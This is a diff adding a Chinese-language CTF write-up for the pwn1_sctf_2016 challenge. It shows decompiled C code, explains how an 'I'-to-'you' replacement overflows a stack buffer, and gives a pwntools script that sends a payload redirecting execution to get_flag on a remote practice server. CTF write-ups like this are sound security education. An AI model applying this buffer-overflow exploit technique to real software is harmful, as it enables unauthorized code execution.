@@ -1,4 +1,4 @@
-# PWN challenges 一些非常见题型
+# PWN challenges
 
 ## [NewStarCTF 公开赛赛道]ret2shellcode
 
@@ -61,3 +61,66 @@ io.interactive()
 运行脚本，得到flag
 
 > <img src="./img_c/4.png">
+
+## pwn1_sctf_2016 1
+
+主要看`vuln()`函数
+
+```c
+int vuln()
+{
+  const char *v0; // eax
+  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
+  _BYTE v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF
+  _BYTE v4[7]; // [esp+40h] [ebp-18h] BYREF
+  char v5; // [esp+47h] [ebp-11h] BYREF
+  _BYTE v6[7]; // [esp+48h] [ebp-10h] BYREF
+  _BYTE v7[5]; // [esp+4Fh] [ebp-9h] BYREF
+
+  printf("Tell me something about yourself: ");
+  fgets(s, 32, edata);
+  std::string::operator=(&input, s);
+  std::allocator<char>::allocator(&v5);
+  std::string::string(v4, "you", &v5);
+  std::allocator<char>::allocator(v7);
+  std::string::string(v6, "I", v7);
+  replace(v3);
+  std::string::operator=(&input, v3, v6, v4);
+  std::string::~string(v3);
+  std::string::~string(v6);
+  std::allocator<char>::~allocator(v7);
+  std::string::~string(v4);
+  std::allocator<char>::~allocator(&v5);
+  v0 = std::string::c_str(&input);
+  strcpy(s, v0);
+  return printf("So, %s\n", s);
+}
+```
+
+大致内容是`fgets()`接收32字节的输入，传入`s`字符数组，然后执行替换函数`replace`，将`s`中的`I`替换为`you`，最后通过`strcpy()`将替换的结果返还`s`字符数组
+
+这道题便是利用替换函数进行溢出，`s`位于`ebp - 0x3C`的位置，即60字节，只需要传入20个`I`，经过替换函数替换为20个`you`，然后拼接`ebp`和`ret_addr`即可，这道题的`ret_addr`是`get_flag()`函数，位于`0x08048F0D`
+
+```c
+int get_flag()
+{
+  return system("cat flag.txt");
+}
+```
+
+因此脚本为
+
+```py
+from pwn import *
+
+# sh = process('./pwn1_sctf_2016')
+sh = remote('node5.buuoj.cn', 25308)
+
+binsh = 0x8048F0D
+payload = flat([b'I' * 20, b'aaa', binsh])
+sh.sendline(payload)
+sh.interactive()
+```
+
+> <img src="./img_c/5.png">
+
